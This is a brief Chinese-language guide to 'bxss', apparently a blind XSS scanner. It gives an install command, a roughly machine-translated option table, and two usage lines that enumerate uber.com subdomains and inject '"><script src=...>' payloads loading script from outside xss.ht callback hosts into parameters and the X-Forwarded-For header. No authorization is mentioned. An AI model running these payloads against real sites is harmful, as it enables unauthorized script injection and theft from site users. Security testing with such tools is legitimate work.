<center>Bxss盲xss扫描</center>





[toc]









## Bxss盲xss扫描

> Blind XSS Scanner 是一种可用于扫描 Web 应用程序中的盲 XSS 漏洞的工具。
>
> [github](https://github.com/ethicalhackingplayground/bxss)







## 1. 安装

```shell
go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
```

参数

|                       |                                |            |
| --------------------- | ------------------------------ | ---------- |
| 争论                  | 描述                           | 默认       |
| `-appendMode`         | 将有效载荷附加到参数           |            |
| `-concurrency int`    | 设置并发                       | 三十       |
| `-header string`      | 设置自定义标头                 | “用户代理” |
| `-headerFile string`  | 包含要测试的标头的文件路径     |            |
| `-parameters`         | 测试盲xss的参数                |            |
| `-payload string`     | 盲目XSS载荷                    |            |
| `-payloadFile string` | 包含要测试的有效载荷的文件路径 |            |





### 2.使用

```shell
# 参数中的盲xss
subfinder uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters

# x-forwarded-for中xss
subfinder uber.com | gau | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"
```

